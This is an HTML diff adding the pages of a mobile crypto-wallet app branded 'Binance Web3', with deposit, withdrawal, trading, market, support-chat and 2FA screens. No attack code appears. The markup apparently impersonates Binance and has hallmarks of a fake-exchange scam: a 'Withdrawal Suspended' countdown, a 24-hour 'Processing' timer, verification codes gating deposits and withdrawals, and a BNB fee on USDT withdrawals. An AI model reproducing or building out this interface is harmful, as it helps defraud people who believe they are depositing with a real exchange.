+  <div id="pageContentContainer" class="page-content">
+
+    <!-- HOME PAGE -->
+    <div id="home" class="page p-4 space-y-5">
+      <!-- Live Ticker -->
+      <div class="ticker-wrap">
+        <div id="homeTicker" class="ticker text-muted font-semibold text-xs">
+          <span class="ticker-item">Loading live markets...</span>
+        </div>
+      </div>
+
+      <!-- User ID and Balance Card -->
+      <div class="card space-y-4 relative overflow-hidden">
+        <div class="absolute top-0 right-0 w-32 h-32 bg-accent/5 rounded-full -translate-y-1/2 translate-x-1/2 blur-2xl pointer-events-none"></div>
+        <div class="flex items-center justify-between">
+          <div class="flex items-center gap-2">
+            <svg class="w-4 h-4 text-muted"><use href="#icon-hash"/></svg>
+            <p class="text-xs text-muted font-medium uppercase tracking-wider">Account ID</p>
+          </div>
+          <p id="userIDDisplay" class="text-sm font-mono text-text font-semibold"></p>
+        </div>
+        <div>
+          <p class="text-xs text-muted font-medium uppercase tracking-wider mb-1">Total Balance</p>
+          <p id="totalBalanceDisplay" class="text-3xl font-extrabold tracking-tight flex items-end gap-2">
+            <span class="text-text">$0.00</span>
+            <span id="balanceChange" class="text-sm font-semibold"></span>
+          </p>
+        </div>
+        <div class="flex gap-3 pt-1">
+          <button onclick="openDepositCoinSelection()" class="flex-1 btn-primary">
+            <svg class="w-4 h-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 15V3m0 0l-4 4m4-4l4 4"/><path d="M2 17l.621 2.485A2 2 0 004.561 21h14.878a2 2 0 001.94-1.515L22 17"/></svg>
+            <span>Deposit</span>
+          </button>
+          <button onclick="showWithdrawalSelector()" class="flex-1 btn-secondary">
+            <svg class="w-4 h-4 text-text" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v12m0 0l-4-4m4 4l4-4"/><path d="M2 17l.621 2.485A2 2 0 004.561 21h14.878a2 2 0 001.94-1.515L22 17"/></svg>
+            <span>Withdraw</span>
+          </button>
+        </div>
+      </div>
+
+      <!-- Quick Actions -->
+      <div class="grid grid-cols-4 gap-3">
+        <button onclick="showPage('trade')" class="flex flex-col items-center gap-1.5 p-3 rounded-xl bg-card border border-border hover:border-border-light transition-colors">
+          <div class="w-10 h-10 rounded-full bg-accent/10 flex items-center justify-center">
+            <svg class="w-5 h-5 text-accent"><use href="#icon-trade"/></svg>
+          </div>
+          <span class="text-[11px] font-semibold text-text-secondary">Trade</span>
+        </button>
+        <button onclick="showPage('market')" class="flex flex-col items-center gap-1.5 p-3 rounded-xl bg-card border border-border hover:border-border-light transition-colors">
+          <div class="w-10 h-10 rounded-full bg-success/10 flex items-center justify-center">
+            <svg class="w-5 h-5 text-success"><use href="#icon-chart"/></svg>
+          </div>
+          <span class="text-[11px] font-semibold text-text-secondary">Markets</span>
+        </button>
+        <button onclick="showPage('accountDetails')" class="flex flex-col items-center gap-1.5 p-3 rounded-xl bg-card border border-border hover:border-border-light transition-colors">
+          <div class="w-10 h-10 rounded-full bg-info/10 flex items-center justify-center">
+            <svg class="w-5 h-5 text-info"><use href="#icon-shield"/></svg>
+          </div>
+          <span class="text-[11px] font-semibold text-text-secondary">Security</span>
+        </button>
+        <button onclick="showPage('search')" class="flex flex-col items-center gap-1.5 p-3 rounded-xl bg-card border border-border hover:border-border-light transition-colors">
+          <div class="w-10 h-10 rounded-full bg-danger/10 flex items-center justify-center">
+            <svg class="w-5 h-5 text-danger"><use href="#icon-search"/></svg>
+          </div>
+          <span class="text-[11px] font-semibold text-text-secondary">Search</span>
+        </button>
+      </div>
+
+      <!-- Holdings Section -->
+      <div>
+        <div class="flex items-center justify-between mb-3">
+          <h2 class="section-title !mb-0">
+            <svg class="w-5 h-5 text-accent"><use href="#icon-wallet"/></svg>
+            Holdings
+          </h2>
+          <button onclick="updateHomeDashboard()" class="p-1.5 rounded-lg hover:bg-white/5 transition-colors">
+            <svg class="w-4 h-4 text-muted"><use href="#icon-refresh"/></svg>
+          </button>
+        </div>
+        <div id="holdingsList" class="space-y-2">
+          <p class="text-muted text-sm text-center py-6 bg-card rounded-xl border border-border">Connect wallet to see holdings.</p>
+        </div>
+      </div>
+
+      <!-- Live Prices Performance Charts -->
+      <div>
+        <h2 class="section-title">
+          <svg class="w-5 h-5 text-accent"><use href="#icon-candle"/></svg>
+          Live Price Performance
+        </h2>
+        <div class="tv-container" style="height: 320px;">
+          <div id="tvChartContainer" class="w-full h-full"></div>
+        </div>
+      </div>
+
+      <!-- Hot Coins Section -->
+      <div>
+        <div class="flex items-center justify-between mb-3">
+          <h2 class="section-title !mb-0">
+            <svg class="w-5 h-5 text-danger"><use href="#icon-fire"/></svg>
+            Hot Coins
+          </h2>
+          <span class="text-xs text-muted">24h Trending</span>
+        </div>
+        <div id="hotCoinsList" class="grid grid-cols-2 gap-3">
+          <div class="col-span-2 flex items-center justify-center py-8 bg-card rounded-xl border border-border">
+            <div class="spinner mr-3"></div>
+            <span class="text-sm text-muted">Loading hot coins...</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Live News Snippet -->
+      <div>
+        <h2 class="section-title">
+          <svg class="w-5 h-5 text-accent"><use href="#icon-news"/></svg>
+          Latest News
+        </h2>
+        <div id="homeNewsSnippet" class="space-y-2">
+          <div class="flex items-center justify-center py-6 bg-card rounded-xl border border-border">
+            <div class="spinner mr-3"></div>
+            <span class="text-sm text-muted">Loading news...</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Transactions & Activity -->
+      <div>
+        <h2 class="section-title">
+          <svg class="w-5 h-5 text-accent"><use href="#icon-clock"/></svg>
+          Transactions & Activity
+        </h2>
+        <div id="activitySection" class="card space-y-1">
+          <p class="text-sm text-muted text-center py-4">No recent activity.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- MARKET PAGE -->
+    <div id="market" class="page p-4 space-y-5 hidden">
+      <!-- Market Overview -->
+      <div id="marketOverview" class="card space-y-4">
+        <div class="flex items-center justify-between">
+          <h2 class="section-title !mb-0">
+            <svg class="w-5 h-5 text-accent"><use href="#icon-globe"/></svg>
+            Market Overview
+          </h2>
+          <span class="badge badge-accent">Live</span>
+        </div>
+        <div class="grid grid-cols-2 gap-3">
+          <div class="bg-surface rounded-lg p-3 border border-border">
+            <p class="text-[11px] text-muted uppercase tracking-wider font-semibold">Total Mkt Cap</p>
+            <p class="text-lg font-bold text-text mt-1" id="mktCap">---</p>
+          </div>
+          <div class="bg-surface rounded-lg p-3 border border-border">
+            <p class="text-[11px] text-muted uppercase tracking-wider font-semibold">24h Volume</p>
+            <p class="text-lg font-bold text-text mt-1" id="mktVol">---</p>
+          </div>
+          <div class="bg-surface rounded-lg p-3 border border-border">
+            <p class="text-[11px] text-muted uppercase tracking-wider font-semibold">BTC Dominance</p>
+            <p class="text-lg font-bold text-text mt-1" id="btcDom">---</p>
+          </div>
+          <div class="bg-surface rounded-lg p-3 border border-border">
+            <p class="text-[11px] text-muted uppercase tracking-wider font-semibold">Active Coins</p>
+            <p class="text-lg font-bold text-text mt-1" id="activeCoins">---</p>
+          </div>
+        </div>
+        <div class="flex items-center gap-2 pt-1">
+          <svg class="w-4 h-4 text-muted"><use href="#icon-info"/></svg>
+          <p class="text-xs text-muted">Data sourced from CoinGecko & AlphaVantage in real-time.</p>
+        </div>
+      </div>
+
+      <!-- Live News -->
+      <div id="marketNews" class="space-y-3">
+        <div class="flex items-center justify-between">
+          <h2 class="section-title !mb-0">
+            <svg class="w-5 h-5 text-accent"><use href="#icon-news"/></svg>
+            Market News
+          </h2>
+          <button onclick="loadLiveNews()" class="p-1.5 rounded-lg hover:bg-white/5 transition-colors">
+            <svg class="w-4 h-4 text-muted"><use href="#icon-refresh"/></svg>
+          </button>
+        </div>
+        <div id="newsContent" class="space-y-3">
+          <div class="flex items-center justify-center py-8 bg-card rounded-xl border border-border">
+            <div class="spinner mr-3"></div>
+            <span class="text-sm text-muted">Fetching latest news...</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- A-Z Symbol Browser -->
+      <div class="space-y-3">
+        <div class="flex items-center justify-between">
+          <h2 class="section-title !mb-0">
+            <svg class="w-5 h-5 text-accent"><use href="#icon-sort"/></svg>
+            All Symbols A-Z
+          </h2>
+          <span class="text-xs text-muted" id="azCount">0 assets</span>
+        </div>
+        <div class="relative">
+          <svg class="w-4 h-4 text-muted absolute left-3 top-1/2 -translate-y-1/2 pointer-events-none"><use href="#icon-search"/></svg>
+          <input type="text" id="azSearchInput" placeholder="Search symbol or name..." class="pl-9 pr-4" oninput="filterAZSymbols(this.value)">
+        </div>
+        <div id="azJumpBar" class="az-jumpbar"></div>
+        <div id="azSymbolsList" class="space-y-2 max-h-[500px] overflow-y-auto pr-1">
+          <div class="flex items-center justify-center py-8 bg-card rounded-xl border border-border">
+            <div class="spinner mr-3"></div>
+            <span class="text-sm text-muted">Loading symbols...</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Top Coins List -->
+      <div>
+        <h2 class="section-title">
+          <svg class="w-5 h-5 text-accent"><use href="#icon-star"/></svg>
+          Top Coins
+        </h2>
+        <div id="topCoinsList" class="space-y-2">
+          <div class="flex items-center justify-center py-8 bg-card rounded-xl border border-border">
+            <div class="spinner mr-3"></div>
+            <span class="text-sm text-muted">Loading coins...</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Exchange Rates -->
+      <div class="card space-y-3">
+        <h2 class="section-title !mb-0">
+          <svg class="w-5 h-5 text-accent"><use href="#icon-globe"/></svg>
+          Forex Rates (USD Base)
+        </h2>
+        <div id="forexRates" class="grid grid-cols-3 gap-2 text-center">
+          <div class="col-span-3 flex items-center justify-center py-4">
+            <div class="spinner mr-3"></div>
+            <span class="text-sm text-muted">Loading rates...</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- TRADE PAGE -->
+    <div id="trade" class="page p-0 space-y-0 hidden">
+      <div class="p-4 pt-3 bg-surface border-b border-border flex items-center justify-between sticky top-0 z-10">
+        <div class="flex items-center gap-2">
+          <svg class="w-5 h-5 text-accent"><use href="#icon-candle"/></svg>
+          <h2 class="text-lg font-bold tracking-tight">BTC/USDT</h2>
+          <span class="text-success text-xs font-bold bg-success/10 px-2 py-0.5 rounded">+2.14%</span>
+        </div>
+        <button class="text-accent text-xs font-bold bg-accent/10 px-3 py-1.5 rounded-lg hover:bg-accent/20 transition-colors">Change Pair</button>
+      </div>
+      <div class="tv-container !border-0 !rounded-none" style="height: 380px;">
+        <div id="tradeChartContainer" class="w-full h-full"></div>
+      </div>
+      <div class="p-4 grid grid-cols-2 gap-3">
+        <button class="bg-success text-white py-3.5 rounded-xl font-bold text-lg hover:brightness-110 active:scale-[0.98] transition-all flex items-center justify-center gap-2">
+          <svg class="w-5 h-5" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 15V3m0 0l-4 4m4-4l4 4"/></svg>
+          Buy
+        </button>
+        <button class="bg-danger text-white py-3.5 rounded-xl font-bold text-lg hover:brightness-110 active:scale-[0.98] transition-all flex items-center justify-center gap-2">
+          <svg class="w-5 h-5" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v12m0 0l-4-4m4 4l4-4"/></svg>
+          Sell
+        </button>
+      </div>
+      <div class="px-4 pb-4">
+        <div class="card space-y-3">
+          <div class="flex items-center justify-between text-sm">
+            <span class="text-muted">Available</span>
+            <span class="font-semibold text-text" id="tradeAvailable">0.00 USDT</span>
+          </div>
+          <div class="flex items-center justify-between text-sm">
+            <span class="text-muted">Margin</span>
+            <span class="font-semibold text-text">Cross 10x</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ACCOUNT PAGE -->
+    <div id="account" class="page p-4 space-y-5 hidden">
+      <div class="card space-y-4 relative overflow-hidden">
+        <div class="absolute top-0 right-0 w-40 h-40 bg-accent/5 rounded-full -translate-y-1/2 translate-x-1/2 blur-3xl pointer-events-none"></div>
+        <div class="flex items-center gap-3 mb-1">
+          <div class="w-12 h-12 rounded-full bg-gradient-to-br from-accent to-yellow-600 flex items-center justify-center shadow-lg">
+            <svg class="w-6 h-6 text-[#181A20]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" fill="currentColor"><path d="M16 4l4.2 4.2-1.7 1.7L16 7.3l-2.5 2.6-1.7-1.7L16 4z"/></svg>
+          </div>
+          <div>
+            <h2 class="text-xl font-bold">My Wallet</h2>
+            <p class="text-xs text-muted">Binance Web3</p>
+          </div>
+        </div>
+        <div class="space-y-3">
+          <div class="flex items-center justify-between py-2 border-b border-border">
+            <div class="flex items-center gap-2">
+              <svg class="w-4 h-4 text-muted"><use href="#icon-hash"/></svg>
+              <span class="text-sm text-muted">User Account ID</span>
+            </div>
+            <p id="accountUserID" class="text-sm font-mono text-text font-semibold">---</p>
+          </div>
+          <div class="flex items-center justify-between py-2 border-b border-border">
+            <div class="flex items-center gap-2">
+              <svg class="w-4 h-4 text-muted"><use href="#icon-wallet"/></svg>
+              <span class="text-sm text-muted">Wallet Address</span>
+            </div>
+            <p id="accountWalletAddress" class="text-sm font-mono text-text break-all max-w-[50%] text-right">---</p>
+          </div>
+          <div class="flex items-center justify-between py-2">
+            <div class="flex items-center gap-2">
+              <svg class="w-4 h-4 text-muted"><use href="#icon-chart"/></svg>
+              <span class="text-sm text-muted">Total Balance</span>
+            </div>
+            <p id="accountWalletBalance" class="text-sm font-bold text-text">---</p>
+          </div>
+        </div>
+      </div>
+
+      <button onclick="showPage('accountDetails')" class="w-full btn-secondary justify-between py-3.5">
+        <span class="flex items-center gap-2">
+          <svg class="w-4 h-4 text-accent"><use href="#icon-shield"/></svg>
+          Account Details Panel
+        </span>
+        <svg class="w-4 h-4 text-accent"><use href="#icon-arrow-right"/></svg>
+      </button>
+      <button onclick="disconnectWallet()" class="w-full btn-danger py-3.5">
+        <svg class="w-4 h-4 inline-block mr-2" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 01-2-2V5a2 2 0 012-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
+        Disconnect Wallet
+      </button>
+    </div>
+
+    <!-- DEPOSIT FLOW -->
+    <div id="depositCoinSelectionPage" class="page p-4 space-y-4 hidden">
+      <div class="flex items-center gap-3 mb-2">
+        <button onclick="showPage('home')" class="p-2 rounded-lg hover:bg-white/5 transition-colors">
+          <svg class="w-5 h-5 text-muted"><use href="#icon-arrow-left"/></svg>
+        </button>
+        <h2 class="text-xl font-bold">Select Deposit Asset</h2>
+      </div>
+      <div class="relative">
+        <svg class="w-4 h-4 text-muted absolute left-3 top-1/2 -translate-y-1/2 pointer-events-none"><use href="#icon-search"/></svg>
+        <input type="text" id="depositSearch" placeholder="Search coin name or symbol" class="pl-9 pr-4">
+      </div>
+      <div id="depositCoinList" class="space-y-2"></div>
+    </div>
+
+    <div id="depositNetworkPage" class="page p-4 space-y-4 hidden">
+      <div class="flex items-center gap-3 mb-2">
+        <button onclick="showPage('depositCoinSelectionPage')" class="p-2 rounded-lg hover:bg-white/5 transition-colors">
+          <svg class="w-5 h-5 text-muted"><use href="#icon-arrow-left"/></svg>
+        </button>
+        <h2 class="text-xl font-bold">Select Network</h2>
+      </div>
+      <p class="text-sm text-muted">For <span id="depositCoinName" class="text-text font-semibold"></span></p>
+      <div id="networkSelectionList" class="space-y-3"></div>
+    </div>
+
+    <div id="depositAddressPage" class="page p-4 space-y-4 hidden">
+      <div class="flex items-center justify-between mb-2">
+        <div class="flex items-center gap-3">
+          <button onclick="showPage('depositNetworkPage')" class="p-2 rounded-lg hover:bg-white/5 transition-colors">
+            <svg class="w-5 h-5 text-muted"><use href="#icon-arrow-left"/></svg>
+          </button>
+          <h2 class="text-xl font-bold">Deposit <span id="depositNetworkHeader"></span></h2>
+        </div>
+        <button onclick="showPage('depositCoinSelectionPage')" class="text-xs text-accent font-bold hover:opacity-80">Change</button>
+      </div>
+      <div class="card text-center space-y-5">
+        <div class="bg-surface rounded-xl p-4 inline-block mx-auto border border-border">
+          <div id="qrcode" class="bg-white p-2 rounded-lg"></div>
+        </div>
+        <div class="flex items-center justify-center gap-1.5">
+          <svg class="w-4 h-4 text-danger"><use href="#icon-alert-triangle"/></svg>
+          <p class="text-xs text-danger font-bold">Only send <span id="depositAddressCoinSymbol"></span> to this address</p>
+        </div>
+        <div class="bg-surface rounded-lg p-3 text-left border border-border">
+          <p class="text-xs text-muted uppercase tracking-wider font-semibold mb-1">Deposit Address</p>
+          <p id="depositAddressDisplay" class="font-mono text-sm text-text break-all leading-relaxed">---</p>
+        </div>
+        <button onclick="copyDepositAddress()" class="w-full btn-secondary text-accent border-accent/30 hover:bg-accent/5">
+          <svg class="w-4 h-4"><use href="#icon-copy"/></svg>
+          Copy Address
+        </button>
+        <div id="depositAmountWrap" class="pt-2">
+          <label class="text-xs text-muted uppercase tracking-wider font-semibold block mb-2">Enter Amount to Deposit</label>
+          <input type="number" id="depositAmountInput" placeholder="0.00" class="text-center text-lg font-bold">
+          <button id="depositNextBtn" onclick="showDepositConfirmationPage()" class="w-full btn-primary mt-3">Continue</button>
+        </div>
+      </div>
+    </div>
+
+    <div id="depositConfirmPage" class="page p-4 space-y-4 hidden">
+      <div class="flex items-center gap-3 mb-2">
+        <button onclick="showPage('depositAddressPage')" class="p-2 rounded-lg hover:bg-white/5 transition-colors">
+          <svg class="w-5 h-5 text-muted"><use href="#icon-arrow-left"/></svg>
+        </button>
+        <h2 class="text-xl font-bold">Confirm Deposit</h2>
+      </div>
+      <div class="card space-y-4">
+        <div class="text-center py-4">
+          <p class="text-xs text-muted uppercase tracking-wider font-semibold">Amount to Confirm</p>
+          <p class="text-3xl font-extrabold text-success mt-2">$<span id="depositConfirmAmount"></span> <span class="text-sm font-medium text-muted">USD</span></p>
+        </div>
+        <div class="h-px bg-border"></div>
+        <div class="space-y-2">
+          <label class="text-xs text-muted uppercase tracking-wider font-semibold">Verification Code</label>
+          <input type="number" id="depositVerificationCode" placeholder="6-digit code (e.g., 000000)">
+          <p id="depositCodeError" class="text-danger text-sm hidden flex items-center gap-1">
+            <svg class="w-3.5 h-3.5"><use href="#icon-alert-triangle"/></svg>
+            <span>Invalid code</span>
+          </p>
+        </div>
+        <button onclick="handleDepositConfirmation()" class="w-full btn-primary mt-2">Submit Deposit</button>
+      </div>
+    </div>
+
+    <!-- WITHDRAWAL FLOW -->
+    <div id="withdrawalSelector" class="fixed inset-0 modal-backdrop hidden flex items-end justify-center">
+      <div class="modal-content w-full max-w-[600px] p-5 space-y-4 transition-transform duration-300 transform translate-y-full">
+        <div class="flex items-center justify-between border-b border-border pb-3">
+          <h2 class="text-lg font-bold">Select Withdrawal Method</h2>
+          <button onclick="hideModal('withdrawalSelector')" class="p-1.5 rounded-lg hover:bg-white/5 transition-colors">
+            <svg class="w-5 h-5 text-muted"><use href="#icon-close"/></svg>
+          </button>
+        </div>
+        <button onclick="showWithdrawalDetailsPage()" class="w-full btn-secondary justify-between py-4">
+          <span class="flex items-center gap-3">
+            <div class="w-8 h-8 rounded-full bg-accent/10 flex items-center justify-center">
+              <svg class="w-4 h-4 text-accent"><use href="#icon-external"/></svg>
+            </div>
+            <span class="text-left">
+              <span class="block text-sm font-semibold text-text">On-Chain Transfer</span>
+              <span class="block text-xs text-muted">Withdraw to external wallet address</span>
+            </span>
+          </span>
+          <svg class="w-4 h-4 text-accent"><use href="#icon-arrow-right"/></svg>
+        </button>
+        <button onclick="showPage('account')" class="w-full btn-secondary justify-between py-4">
+          <span class="flex items-center gap-3">
+            <div class="w-8 h-8 rounded-full bg-success/10 flex items-center justify-center">
+              <svg class="w-4 h-4 text-success"><use href="#icon-send"/></svg>
+            </div>
+            <span class="text-left">
+              <span class="block text-sm font-semibold text-text">Internal Transfer</span>
+              <span class="block text-xs text-muted">Send to another Binance User ID</span>
+            </span>
+          </span>
+          <svg class="w-4 h-4 text-accent"><use href="#icon-arrow-right"/></svg>
+        </button>
+        <button onclick="hideModal('withdrawalSelector')" class="w-full btn-secondary mt-2">Cancel</button>
+      </div>
+    </div>
+
+    <div id="withdrawalDetailsPage" class="page p-4 space-y-4 hidden">
+      <div class="flex items-center gap-3 mb-2">
+        <button onclick="showPage('home')" class="p-2 rounded-lg hover:bg-white/5 transition-colors">
+          <svg class="w-5 h-5 text-muted"><use href="#icon-arrow-left"/></svg>
+        </button>
+        <h2 class="text-xl font-bold">Withdraw USDT</h2>
+      </div>
+      <div class="space-y-4">
+        <div class="relative">
+          <label class="text-xs text-muted uppercase tracking-wider font-semibold mb-1.5 block">Withdrawal Address</label>
+          <input type="text" id="withdrawalAddress" placeholder="0x..." class="pr-28">
+          <button onclick="fillFromConnectedWallet()" class="absolute right-2 top-[30px] text-accent text-xs font-bold hover:opacity-80 px-2 py-1 rounded bg-accent/10">Fill Wallet</button>
+        </div>
+        <div class="relative">
+          <label class="text-xs text-muted uppercase tracking-wider font-semibold mb-1.5 block">Network</label>
+          <select id="withdrawalNetwork" class="appearance-none pr-10">
+            <option value="" disabled selected>Select Network</option>
+            <option value="Ethereum">ETH Ethereum (ERC20)</option>
+            <option value="Bitcoin">BTC Bitcoin Network</option>
+            <option value="BSC">BSC BEP20 (Binance Smart Chain)</option>
+            <option value="Tron">TRX Tron (TRC20)</option>
+          </select>
+          <svg class="w-4 h-4 absolute right-3 top-[38px] text-muted pointer-events-none"><use href="#icon-chevron-down"/></svg>
+        </div>
+        <div>
+          <label class="text-xs text-muted uppercase tracking-wider font-semibold mb-1.5 block">Amount (USD)</label>
+          <div class="relative">
+            <input type="number" id="withdrawalAmount" placeholder="0.00" class="pr-16 text-lg font-bold">
+            <button onclick="fillMaxAmount()" class="absolute right-0 top-0 h-full px-4 text-accent text-sm font-bold hover:opacity-80">Max</button>
+          </div>
+        </div>
+        <div class="flex justify-between text-sm py-2 border-t border-border">
+          <span class="text-muted">Network Fee</span>
+          <span class="font-semibold text-text">0.25834 BNB</span>
+        </div>
+        <div id="suspensionWarning" class="bg-danger/10 text-danger p-3 rounded-lg text-sm hidden border border-danger/20 flex items-start gap-2">
+          <svg class="w-4 h-4 mt-0.5 flex-shrink-0"><use href="#icon-alert-triangle"/></svg>
+          <div>
+            <p class="font-bold">Withdrawal Suspended</p>
+            <p class="text-xs opacity-90">Time remaining: <span id="suspensionCountdown"></span></p>
+          </div>
+        </div>
+        <button onclick="showWithdrawalConfirmationPage()" id="withdrawBtn" class="w-full btn-primary mt-2">Withdraw</button>
+      </div>
+    </div>
+
+    <div id="withdrawalConfirmationPage" class="page p-4 space-y-4 hidden">
+      <div class="flex items-center gap-3 mb-2">
+        <button onclick="showPage('withdrawalDetailsPage')" class="p-2 rounded-lg hover:bg-white/5 transition-colors">
+          <svg class="w-5 h-5 text-muted"><use href="#icon-arrow-left"/></svg>
+        </button>
+        <h2 class="text-xl font-bold">Confirm Withdrawal</h2>
+      </div>
+      <div class="card space-y-4">
+        <div class="text-center py-3">
+          <p class="text-xs text-muted uppercase tracking-wider font-semibold">Confirm Amount</p>
+          <p class="text-2xl font-bold text-text mt-1">$<span id="confirmAmount"></span> <span class="text-sm font-medium text-muted">USD</span></p>
+        </div>
+        <div class="h-px bg-border"></div>
+        <div class="space-y-2">
+          <label class="text-xs text-muted uppercase tracking-wider font-semibold">Validation Code</label>
+          <input type="number" id="withdrawalValidationCode" placeholder="6-digit code (e.g., 000000)">
+          <p id="withdrawalCodeError" class="text-danger text-sm hidden flex items-center gap-1">
+            <svg class="w-3.5 h-3.5"><use href="#icon-alert-triangle"/></svg>
+            <span>Invalid code</span>
+          </p>
+        </div>
+        <button onclick="handleWithdrawalConfirmation()" class="w-full btn-primary mt-2">Submit</button>
+      </div>
+    </div>
+
+    <div id="withdrawalProcessingPage" class="page p-4 space-y-4 hidden">
+      <div class="card text-center space-y-5 py-8">
+        <div class="relative w-20 h-20 mx-auto">
+          <div class="absolute inset-0 rounded-full border-4 border-accent/20"></div>
+          <div class="absolute inset-0 rounded-full border-4 border-transparent border-t-accent animate-spin"></div>
+          <svg class="w-10 h-10 text-accent absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2"><use href="#icon-clock"/></svg>
+        </div>
+        <div>
+          <h2 class="text-2xl font-bold mb-1">Processing</h2>
+          <p class="text-sm text-muted">Your transaction is being confirmed on-chain</p>
+        </div>
+        <div class="bg-surface rounded-xl p-4 border border-border inline-block">
+          <p id="processingCountdown" class="text-3xl font-extrabold text-accent font-mono">24:00:00</p>
+        </div>
+        <div class="text-left space-y-2 text-sm bg-surface rounded-xl p-4 border border-border">
+          <div class="flex justify-between"><span class="text-muted">Address</span><span class="font-mono text-text break-all max-w-[60%] text-right" id="procAddress"></span></div>
+          <div class="flex justify-between"><span class="text-muted">Network</span><span class="text-text font-semibold" id="procNetwork"></span></div>
+          <div class="flex justify-between"><span class="text-muted">Amount</span><span class="text-text font-semibold" id="procAmount"></span></div>
+        </div>
+        <button onclick="showPage('home')" class="w-full btn-secondary">View Details</button>
+      </div>
+    </div>
+
+    <!-- NOTIFICATION PAGE -->
+    <div id="notification" class="page p-4 space-y-5 hidden">
+      <h2 class="text-2xl font-bold flex items-center gap-2">
+        <svg class="w-6 h-6 text-accent"><use href="#icon-bell"/></svg>
+        Notifications
+      </h2>
+      <div class="card flex items-center justify-between">
+        <div class="flex items-center gap-3">
+          <div class="w-10 h-10 rounded-full bg-accent/10 flex items-center justify-center">
+            <svg class="w-5 h-5 text-accent"><use href="#icon-bell"/></svg>
+          </div>
+          <div>
+            <p class="font-semibold text-sm">Daily Market Updates</p>
+            <p class="text-xs text-muted">Price alerts & news</p>
+          </div>
+        </div>
+        <label class="switch">
+          <input type="checkbox" id="notificationToggle" onchange="toggleNotifications(this.checked)">
+          <span class="slider"></span>
+        </label>
+      </div>
+      <h3 class="text-sm font-bold text-muted uppercase tracking-wider">Latest Alerts</h3>
+      <div id="notificationList" class="space-y-3">
+        <p class="text-sm text-muted text-center py-6 bg-card rounded-xl border border-border">No recent alerts.</p>
+      </div>
+    </div>
+
+    <!-- SEARCH PAGE -->
+    <div id="search" class="page p-4 space-y-4 hidden">
+      <h2 class="text-2xl font-bold flex items-center gap-2">
+        <svg class="w-6 h-6 text-accent"><use href="#icon-search"/></svg>
+        Search
+      </h2>
+      <div class="relative">
+        <svg class="w-4 h-4 text-muted absolute left-3 top-1/2 -translate-y-1/2 pointer-events-none"><use href="#icon-search"/></svg>
+        <input type="text" id="globalSearchInput" placeholder="Search markets, coins, news..." class="pl-9 pr-4">
+      </div>
+      <div id="searchResults" class="space-y-3">
+        <p class="text-sm text-muted text-center py-6 bg-card rounded-xl border border-border">Start typing to search assets and news.</p>
+      </div>
+    </div>
+
+    <!-- CHAT PAGE -->
+    <div id="chat" class="page p-4 space-y-4 hidden">
+      <h2 class="text-2xl font-bold flex items-center gap-2">
+        <svg class="w-6 h-6 text-accent"><use href="#icon-chat"/></svg>
+        Support Chat
+      </h2>
+      <div id="chatContainer" class="h-[520px] flex flex-col card p-0 overflow-hidden">
+        <div id="chatMessages" class="flex-1 p-4 overflow-y-auto space-y-4">
+          <div class="flex justify-start">
+            <div class="bg-accent text-[#181A20] p-3 rounded-2xl rounded-bl-sm max-w-[85%] shadow-md text-sm font-medium">
+              Hello! I'm your Binance Web3 Assistant. How can I help you today?
+            </div>
+          </div>
+        </div>
+        <div class="p-3 border-t border-border flex gap-2 bg-surface">
+          <input type="text" id="chatInput" placeholder="Type your question..." class="flex-1 !bg-card" onkeydown="if(event.key==='Enter')sendChatMessage()">
+          <button onclick="sendChatMessage()" class="btn-primary w-12 !px-0">
+            <svg class="w-5 h-5" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- ACCOUNT DETAILS -->
+    <div id="accountDetails" class="page p-4 space-y-5 hidden">
+      <div class="flex items-center gap-3 mb-2">
+        <button onclick="showPage('account')" class="p-2 rounded-lg hover:bg-white/5 transition-colors">
+          <svg class="w-5 h-5 text-muted"><use href="#icon-arrow-left"/></svg>
+        </button>
+        <h2 class="text-2xl font-bold">Account Details</h2>
+      </div>
+      <div class="card space-y-3">
+        <div class="flex items-center justify-between py-2 border-b border-border">
+          <span class="text-sm text-muted">User Account ID</span>
+          <p id="detailUserID" class="text-sm font-mono text-text font-semibold">---</p>
+        </div>
+        <div class="flex items-center justify-between py-2 border-b border-border">
+          <span class="text-sm text-muted">Wallet Address</span>
+          <p id="detailWalletAddress" class="text-sm font-mono text-text break-all max-w-[50%] text-right">---</p>
+        </div>
+        <div class="flex items-center justify-between py-2">
+          <span class="text-sm text-muted">Deposit Balance</span>
+          <p id="detailWalletBalance" class="text-sm font-bold text-text">---</p>
+        </div>
+      </div>
+      <button onclick="showPage('googleAuthVerification')" class="w-full btn-primary justify-between py-3.5">
+        <span class="flex items-center gap-2">
+          <svg class="w-5 h-5"><use href="#icon-shield"/></svg>
+          Secure Account (2FA)
+        </span>
+        <svg class="w-4 h-4"><use href="#icon-arrow-right"/></svg>
+      </button>
